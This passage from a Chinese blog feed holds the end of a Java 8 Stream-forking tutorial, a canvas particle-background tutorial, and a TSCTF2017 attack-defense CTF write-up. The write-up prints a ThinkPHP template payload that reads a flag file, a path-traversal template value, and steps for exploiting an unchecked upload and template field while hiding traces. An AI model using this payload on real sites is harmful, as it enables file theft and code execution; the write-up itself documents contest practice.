Spliterator&lt;T&gt; <span class="title">trySplit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">estimateSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">characteristics</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Spliterator接口有四个方法需要实现。</p><ol><li><code>tryAdvance()</code> 定义如何顺序遍历每个元素，如果还有需要遍历的元素，返回 <code>true</code>，否则返回 <code>false</code>；它从BlockingQueue中取得原始流的元素，这些元素由ForkingStreamConsumer添加，然后依次处理这些元素。直到发现哨兵元素，表示队列中没有需要处理的元素了。</li><li><code>trySplit()</code> 会将当前元素划分出一部分，返回一个新的Spliterator，同时这两个Spliterator会并行执行。如果无法划分则返回 null。</li><li><code>estimateSize()</code> 用于估算还有多少个元素需要遍历。在这里没有进行估算。</li><li><code>characteristice()</code> 表示该Spliterator有哪些特性，用于可以更好控制和优化Spliterator的使用。</li></ol><p>通过实现的BlockingQueueSpliterator的延迟绑定能力，处理流中的各个元素。</p><h1 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h1><p>上面两部分都已经实现，下面需要实现一个框架，可以包装Stream，为Stream添加fork操作，并获取操作结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BlockingQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CompletableFuture;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Future;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.LinkedBlockingDeque;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Function;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.StreamSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StreamForker</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Stream stream;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Object, Function&lt;Stream&lt;T&gt;, ?&gt;&gt; forks = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StreamForker</span><span class="params">(Stream&lt;T&gt; stream)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stream = stream;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StreamForker&lt;T&gt; <span class="title">fork</span><span class="params">(Object key, Function&lt;Stream&lt;T&gt;, ?&gt; f)</span> </span>&#123;</span><br><span class="line">        forks.put(key, f);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Results <span class="title">getResults</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ForkingStreamConsumer&lt;T&gt; consumer = build();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            stream.forEach(consumer);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            consumer.finish();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> consumer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ForkingStreamConsumer&lt;T&gt; <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;BlockingQueue&lt;T&gt;&gt; queues = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Future&lt;?&gt;&gt; actions = forks.entrySet().stream()</span><br><span class="line">                .reduce(<span class="keyword">new</span> HashMap&lt;Object, Future&lt;?&gt;&gt;(),</span><br><span class="line">                        (map, e) -&gt; &#123;</span><br><span class="line">                            map.put(e.getKey(), getOperationResult(queues, e.getValue()));</span><br><span class="line">                            <span class="keyword">return</span> map;</span><br><span class="line">                        &#125;, (m1, m2) -&gt; &#123;</span><br><span class="line">                            m1.putAll(m2);</span><br><span class="line">                            <span class="keyword">return</span> m1;</span><br><span class="line">                        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ForkingStreamConsumer&lt;&gt;(queues, actions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Future&lt;?&gt; getOperationResult(List&lt;BlockingQueue&lt;T&gt;&gt; queues, Function&lt;Stream&lt;T&gt;, ?&gt; f) &#123;</span><br><span class="line">        BlockingQueue&lt;T&gt; queue = <span class="keyword">new</span> LinkedBlockingDeque&lt;&gt;();</span><br><span class="line">        queues.add(queue);</span><br><span class="line">        Spliterator&lt;T&gt; spliterator = <span class="keyword">new</span> BlockingQueueSpliterator&lt;&gt;(queue);</span><br><span class="line">        Stream&lt;T&gt; source = StreamSupport.stream(spliterator, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> CompletableFuture.supplyAsync(() -&gt; f.apply(source));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StreamForker的构造方法接收一个流，表示需要被fork的流。通过 <code>fork()</code> 方法可以增加标识和操作。</p><p><code>getResults()</code> 方法返回 Results 接口的实现，可以通过标识获取操作结果。通过 <code>build()</code> 构建一个ForkingStreamConsumer，将原始流中的元素挨个分发，最后<code>finish()</code>表示操作结束。</p><p><code>build()</code> 方法用于构建ForkingStreamConsumer，主要创建一个Map，Map的键就是之前的各个操作的标识，值是各个操作的结果，用Futrue来表示。每个Future都是通过 <code>getOperationResult()</code> 创建的。</p><p><code>getOperationResult()</code> 方法会创建一个新的 BlockingQueue，并将其添加到队列的列表。这个BlockingQueue用于存储分发的原始流中的元素，然后将队列绑定到BlockingQueueSpliterator上用来创建一个新的流，最后创建一个Future来执行需要在这个流上应用的操作。</p><h1 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h1><p>到此整个StreamForker就完成了，这里我们应用一下，同时求一个整数流的最大值、最小值和平均值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.IntStream;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Stream&lt;Integer&gt; stream = IntStream.rangeClosed(<span class="number">1</span>, <span class="number">10</span>).boxed();</span><br><span class="line"></span><br><span class="line">        Results results = <span class="keyword">new</span> StreamForker&lt;Integer&gt;(stream)</span><br><span class="line">                .fork(<span class="string">&quot;min&quot;</span>, s -&gt; s.min(Comparator.naturalOrder()).orElse(<span class="keyword">null</span>))</span><br><span class="line">                .fork(<span class="string">&quot;max&quot;</span>, s -&gt; s.max(Comparator.naturalOrder()).orElse(<span class="keyword">null</span>))</span><br><span class="line">                .fork(<span class="string">&quot;avg&quot;</span>, s -&gt; s.mapToInt(x -&gt; x).average().orElse(<span class="number">0</span>))</span><br><span class="line">                .getResults();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> maxVal = results.get(<span class="string">&quot;max&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> minVal = results.get(<span class="string">&quot;min&quot;</span>);</span><br><span class="line">        <span class="keyword">double</span> avgVal = results.get(<span class="string">&quot;avg&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Max Value: &quot;</span> + maxVal);</span><br><span class="line">        System.out.println(<span class="string">&quot;Min Value: &quot;</span> + minVal);</span><br><span class="line">        System.out.println(<span class="string">&quot;Avg Value: &quot;</span> + avgVal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用StreamForker，可以复制一个整数流，并在每个流上应用不同的操作。同时内部实现是异步的， <code>getResults()</code>方法会立即返回，只有当需要取用结果的时候才会尝试等待操作执行完成。</p><p>上面代码的输出如下：</p><blockquote><p>Max Value: 10<br />Min Value: 1<br />Avg Value: 5.5</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看了《Java8实战》，了解了Java8 Stream的一些内容。在Java 8中，流的一个局限性在于，只能遍历一次，再次遍历的时候会出现异常：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;java.lang.IllegalStateException: stream ha</summary>
      
    
    
    
    <category term="读书笔记" scheme="https://sumygg.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="java" scheme="https://sumygg.com/tags/java/"/>
    
    <category term="java8" scheme="https://sumygg.com/tags/java8/"/>
    
    <category term="stream" scheme="https://sumygg.com/tags/stream/"/>
    
    <category term="流" scheme="https://sumygg.com/tags/%E6%B5%81/"/>
    
    <category term="futures" scheme="https://sumygg.com/tags/futures/"/>
    
    <category term="spliterator" scheme="https://sumygg.com/tags/spliterator/"/>
    
  </entry>
  
  <entry>
    <title>为网页添加一个网格粒子动画的背景</title>
    <link href="https://sumygg.com/2017/05/29/make-a-animation-of-grid-particle-in-canvas/"/>
    <id>https://sumygg.com/2017/05/29/make-a-animation-of-grid-particle-in-canvas/</id>
    <published>2017-05-29T10:26:21.000Z</published>
    <updated>2021-03-16T08:51:03.003Z</updated>
    
    <content type="html"><![CDATA[<p>好些日子之前，发现某乎的背景特别漂亮，在某些机缘巧合之下，又在好多地方发现了类似这种“网格粒子”的背景。一种“抄袭之魂”油然而生，对着一篇文章，按照自己的想法实现了一下。本来打算顺势改进一下“引擎”，但是整个做下来发现这个“引擎”改进的方向有点偏，导致好多地方很难看懂了。下面将大体的思路说明一下，具体细节可以参考代码或者【参考文献】中的文章。</p><h1 id="粒子运动"><a class="markdownIt-Anchor" href="#粒子运动"></a> 粒子运动</h1><p>参考物理学的运动，这里每个粒子的运动是独立的，相互之间没有作用力的干扰。在初始化的时候需要给粒子设置初始位置、初始速度、初始速度方向，根据这几个值，就能计算出下一步粒子运动的行为。</p><p>首先定义一些配置变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.opts = &#123;</span><br><span class="line">    particleAmount: <span class="number">100</span>,                  <span class="comment">//粒子个数</span></span><br><span class="line">    defaultSpeed: <span class="number">0.5</span>,                    <span class="comment">//粒子运动速度</span></span><br><span class="line">    variantSpeed: <span class="number">0.5</span>,                    <span class="comment">//粒子运动速度的变量</span></span><br><span class="line">    particleColor: <span class="string">&quot;rgb(32,245,245)&quot;</span>,     <span class="comment">//粒子的颜色</span></span><br><span class="line">    lineColor: <span class="string">&quot;rgb(32,245,245)&quot;</span>,         <span class="comment">//网格连线的颜色</span></span><br><span class="line">    defaultRadius: <span class="number">1</span>,                     <span class="comment">//粒子半径</span></span><br><span class="line">    variantRadius: <span class="number">1</span>,                     <span class="comment">//粒子半径的变量</span></span><br><span class="line">    minDistance: <span class="number">100</span>                      <span class="comment">//粒子之间连线的最小距离</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据这些变量，可以计算出粒子当前的状态信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="built_in">Math</span>.random() * borderWidth;      <span class="comment">// 粒子当前位置</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="built_in">Math</span>.random() * borderHeight;</span><br><span class="line"><span class="keyword">var</span> w = borderWidth;                      <span class="comment">// 粒子运动边界</span></span><br><span class="line"><span class="keyword">var</span> h = borderHeight;</span><br><span class="line"><span class="keyword">var</span> speed = that.opts.defaultSpeed + that.opts.variantSpeed * <span class="built_in">Math</span>.random();     <span class="comment">// 粒子运动速度</span></span><br><span class="line"><span class="keyword">var</span> directionAngle = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);                            <span class="comment">// 粒子运动方向</span></span><br><span class="line"><span class="keyword">var</span> color = that.opts.particleColor;</span><br><span class="line"><span class="keyword">var</span> radius = that.opts.defaultRadius + <span class="built_in">Math</span>.random() * that.opts.variantRadius;  <span class="comment">// 粒子半径</span></span><br><span class="line"><span class="keyword">var</span> vector = &#123;   <span class="comment">// 粒子在某个方向上的加速度</span></span><br><span class="line">    x: speed * <span class="built_in">Math</span>.cos(directionAngle),</span><br><span class="line">    y: speed * <span class="built_in">Math</span>.sin(directionAngle)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>更新操作 <strong>update</strong> ，需要计算出下一帧粒子的位置。如果粒子到达边界，将粒子的该方向上的加速度反向，最后根据加速度更新位置。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (x &gt; w || x &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    vector.x *= -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (y &gt; h || y &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    vector.y *= -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">x += vector.x;</span><br><span class="line">y += vector.y;</span><br></pre></td></tr></table></figure><p>绘制操作 <strong>draw</strong>， 根据状态信息绘制粒子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath();</span><br><span class="line">ctx.arc(x, y, radius, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>);</span><br><span class="line">ctx.closePath();</span><br><span class="line">ctx.fillStyle = color;</span><br><span class="line">ctx.fill();</span><br></pre></td></tr></table></figure><p>然后补充上模板代码，粒子基本的运动操作就完成了。</p><h1 id="划线连接"><a class="markdownIt-Anchor" href="#划线连接"></a> 划线连接</h1><p>上面粒子配置中提到了一个变量 <code>minDistance</code> ，如果两个粒子之间的距离小于该值，就在这两个粒子之间绘制一条连线。但是单纯绘制连线不太美观，最好根据距离，距离越近连线的颜色越深。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; that.spirits.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> distance = <span class="built_in">Math</span>.sqrt(<span class="built_in">Math</span>.pow(x - that.spirits[i].x(), <span class="number">2</span>) + <span class="built_in">Math</span>.pow(y - that.spirits[i].y(), <span class="number">2</span>));</span><br><span class="line">    <span class="keyword">var</span> opacity = <span class="number">1</span> - distance / that.opts.minDistance;</span><br><span class="line">    <span class="keyword">if</span> (opacity &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        ctx.lineWidth = <span class="number">0.5</span>;</span><br><span class="line">        ctx.strokeStyle = <span class="string">&quot;rgba(&quot;</span> + lineColor[<span class="number">0</span>] + <span class="string">&quot;,&quot;</span> + lineColor[<span class="number">1</span>] + <span class="string">&quot;,&quot;</span> + lineColor[<span class="number">2</span>] + <span class="string">&quot;,&quot;</span> + opacity + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        ctx.beginPath();</span><br><span class="line">        ctx.moveTo(x, y);</span><br><span class="line">        ctx.lineTo(that.spirits[i].x(), that.spirits[i].y());</span><br><span class="line">        ctx.closePath();</span><br><span class="line">        ctx.stroke();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>distance</code> 的计算使用了亮点之间的距离公式。把这段代码放到 <strong>draw</strong> 函数内，这样基本上就完成了。</p><p>还需要考虑一点，如果窗口大小改变，那么超出边界的粒子可能再也回不来了。这里为监听了 <code>resize</code> 事件，在resize的时候，如果有粒子超出了窗口范围，那么就将该粒子重新放置到边界位置。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">resize: <span class="function"><span class="keyword">function</span> (<span class="params">width, height</span>) </span>&#123;</span><br><span class="line">    w = width;</span><br><span class="line">    h = height;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= w) x = w;</span><br><span class="line">    <span class="keyword">if</span> (y &gt;= h) y = h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概需要注意的地方就这么多了，我把自己实现的代码放到jsfiddle上，可以参考一下。</p><iframe scrolling="no" width="100%" height="300" src="https://jsfiddle.net/otgn0am4/embedded/js,resources,html,css,result/light" frameborder="0" loading="lazy" allowfullscreen></iframe><h1 id="网页背景"><a class="markdownIt-Anchor" href="#网页背景"></a> 网页背景</h1><p>接下来就是要把这个canvas设置为背景的时候了，需要注意一下几点：</p><ol><li>Canvas代码加载需要一定的时间，所以最好把定义Canvas的CSS背景颜色和网页背景颜色设为一致</li><li>要将Canvas充满背景，需要将Canvas的position设为fixed，Canvas的大小也要与窗口大小innerHeight和innerWidth保持一致</li><li>监听window的resize事件，做到Canvas大小跟随窗口大小</li></ol><p>控制Canvas的CSS，使用fixed控制位置；网页背景与Canvas背景保持一致。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">canvas</span><span class="selector-id">#background-canvas</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: fixed;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f7fafc</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#f7fafc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听窗口的resize事件，然后修改Canvas大小。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 设置Canvas的宽高分别为 window.innerWidth 和 window.innerHeight</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>花了一下午的时间。至此，就为博客换上了一个Canvas背景<img class="emoji" draggable="false" alt="🎉" src="https://twemoji.maxcdn.com/2/72x72/1f389.png"/>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好些日子之前，发现某乎的背景特别漂亮，在某些机缘巧合之下，又在好多地方发现了类似这种“网格粒子”的背景。一种“抄袭之魂”油然而生，对着一篇文章，按照自己的想法实现了一下。本来打算顺势改进一下“引擎”，但是整个做下来发现这个“引擎”改进的方向有点偏，导致好多地方很难看懂了。下</summary>
      
    
    
    
    <category term="果然还是前端" scheme="https://sumygg.com/categories/%E6%9E%9C%E7%84%B6%E8%BF%98%E6%98%AF%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="javascript" scheme="https://sumygg.com/tags/javascript/"/>
    
    <category term="canvas" scheme="https://sumygg.com/tags/canvas/"/>
    
    <category term="粒子" scheme="https://sumygg.com/tags/%E7%B2%92%E5%AD%90/"/>
    
    <category term="前端" scheme="https://sumygg.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>TSCTF2017线下赛心得体会</title>
    <link href="https://sumygg.com/2017/05/20/tsctf-2017-offline-final-contest/"/>
    <id>https://sumygg.com/2017/05/20/tsctf-2017-offline-final-contest/</id>
    <published>2017-05-20T15:38:26.000Z</published>
    <updated>2021-03-16T08:51:03.003Z</updated>
    
    <content type="html"><![CDATA[<p>5月14日举行了TSCTF线下决赛。凭着线上初赛第4的名次，感谢北邮“天枢”战队给了这次机会，有幸能参加这次线下决赛。第一次参加这次攻防性质的线下赛，不免有些不知所措，比赛的时候也是走一步看一步。</p><p>首先说明一下这次线下赛的比赛规则。这次线下赛共有16支队伍参加，其中校内队有6支初赛队和2支大一新生队，校外队邀请了6支高校队伍参加。比赛共有5道题目，2道Web，2道Pwn和1道逆向。其中逆向题由赞助方“深思数盾”提供，逆向题在比赛前2天放出，比赛时提交flag可以多获得3000分初始分。另外4道题都是攻防形式给出，各队可以给自己的题目打补丁防御其它队伍的攻击，flag每个5分钟更换一次，每轮被攻击后减20分，每轮check程序检测服务异常减40分。大致规则就是这样。</p><p>这次比赛感觉有很大的运气成分在里面，比赛结束后居然拿到了第2的名次，比赛结束后的榜单如下：</p><img src="/2017/05/20/tsctf-2017-offline-final-contest/1.png" class="" title="榜单"><p>队伍 <code>Nu1L</code> 真的很强，不仅做出了逆向，而且全程无懈可击。</p><p>由于自己队伍里没有PWN的选手，比赛之前就打算放弃逆向和PWN。给自己队伍定的目标也是不要太难看，能进前10就可以了。所以之前对于提前放出来的逆向题目也没有太关注，感觉挺对不起主办方，毕竟人家给题目放了那么多水。</p><p>比赛当天，上午公布1道Web题和2道Pwn题，下午公布最后一道Web题。比赛开始后，先去服务器上将自己的代码备份一下，并开始Review自己Web。第一道Web题是主办方用thinkphp自己编写的博客系统，目标是防止获取admin权限从而拿到flag。zoolsher刚上来就发现了一个后台未校验权限的漏洞，导致任何登陆用户都可以进入后台。看到这个漏洞后，zoolsher抓紧写自动化脚本，提交其它队的flag，我和另一个队友就手动注册用户记录cookie，并手动抓取几个flag提交一下。上午的时间就是一边使用脚本抓取flag，一边查看其它队伍怎么修补的漏洞，试着改进抓取脚本。有的队伍返回了一个假的flag，被检查程序check down了；有的队伍发现新注册用户就立即删除，于是我们改进每次都新建用户直接登陆抓取；还有些队伍修补了漏洞，这样子就没办法了。</p><p>上午3个小时很快就过去了，中午主办方发了盒饭，很好吃。</p><p>下午大部分队伍修补了漏洞，这个漏洞价值下降，考虑应该使用新的漏洞了。下午一开始就放出了另一道Web题，是一个cms系统 <code>Drupal</code>，版本是 7.54。搜索了几个漏洞，感觉都利用不上，考虑了一下暂时放弃了。这时候主办方提到了上传问题，查看了一下可以上传头像放置在 <code>public/uploads/images/</code> 文件夹内。没有校验上传文件的类型，上传文件保存的格式为 <code>&lt;md5&gt;.&lt;上传文件扩展名&gt;.html</code>，接下来就是查找利用位置。找了一圈，在个人主页发现了问题，个人主页渲染使用的模板名是数据库里的值，而数据库里的值可以通过前端表单修改，虽然前端使用列表框限定选定的值，但是后台却没有对这个值进行过滤，这就有了利用的机会。</p><p>先在自己的服务器上实验一下，thinkphp的模板支持执行php代码，于是构造了一个上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/flag&#x27;</span>);</span><br><span class="line">&#123;/php&#125;</span><br></pre></td></tr></table></figure><p>渲染的模板不能有其它扩展名，于是这个上传文件不能有扩展名，需要上传的文件存为 <code>avatar</code> ，这样上传后的文件就变成了 <code>&lt;md5&gt;..html</code>，正好可以进行渲染。</p><p>总体的步骤如下：</p><ol><li>注册用户</li><li>登陆，修改上传修改个人头像</li><li>获取当前用户ID和上传头像的文件名</li><li>修改个人主页的模板为上传的头像位置 <code>../../../../../public/uploads/images/&lt;头像名&gt;</code>，不带.html</li><li>根据用户ID访问个人主页，拿到flag</li><li>将flag上传</li><li>将模板修改为 <code>default</code> ，防止在数据库里太明显（太坏了）</li></ol><p>一切都测试好之后才开始正式使用，除了第一的 <code>Nu1L</code> ，真是打的其它队一个措手不及。靠着这个漏洞又赚了一波分数。</p><p>下午5个小时就研究了一下这个漏洞。</p><p>比赛总体下来，我们的Pwn次次被打，而且还down过几次，打了也没办法，down只好乖乖把备份传上去整好。真是别人去你家偷东西你还不能还手，门搞坏了也要默默弄好让别人下次接着偷<img class="emoji" draggable="false" alt="👿" src="https://twemoji.maxcdn.com/2/72x72/1f47f.png"/>。下午还发现了一个内存马，杀掉除root以外的apache进程就可以了，<code>sudo -u www-data kill -9 &lt;进程号&gt;</code>，不过杀了一次后他们没有攻第二次，看来他们的洞利用起来有些麻烦，估计是手动的。</p><p>整个比赛下来收获很多，一方面见识了一下强队的风采，另一方面也加深了对CTF的了解。真的感谢 <code>Nu1L</code> 队没有与我们争 Web1 的分数，不然总分肯定会下降不少<img class="emoji" draggable="false" alt="😂" src="https://twemoji.maxcdn.com/2/72x72/1f602.png"/>。最后感谢TSCTF2017主办方“天枢”战队和赞助方“深思数盾”。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;5月14日举行了TSCTF线下决赛。凭着线上初赛第4的名次，感谢北邮“天枢”战队给了这次机会，有幸能参加这次线下决赛。第一次参加这次攻防性质的线下赛，不免有些不知所措，比赛的时候也是走一步看一步。&lt;/p&gt;
&lt;p&gt;首先说明一下这次线下赛的比赛规则。这次线下赛共有16支队伍参加</summary>
      
    
    
    
    <category term="读书笔记" scheme="https://sumygg.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ctf" scheme="https://sumygg.com/tags/ctf/"/>
    
    <category term="tsctf" scheme="https://sumygg.com/tags/tsctf/"/>
    
    <category term="决赛" scheme="https://sumygg.com/tags/%E5%86%B3%E8%B5%9B/"/>
    
    <category term="新建文件夹" scheme="https://sumygg.com/tags/%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
    
  </entry>
  
  <entry>
